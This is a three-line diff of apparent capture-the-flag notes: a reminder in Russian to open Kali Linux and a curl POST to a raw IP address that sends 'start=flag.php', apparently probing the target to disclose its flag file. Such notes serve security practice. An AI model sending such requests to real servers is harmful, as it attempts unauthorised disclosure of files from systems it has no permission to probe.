@@ -1,0 +1,3 @@
+3
+Зайти в кали
+curl -X 'POST' 'http://34.107.71.117:31049/?start=' --data 'start=flag.php'
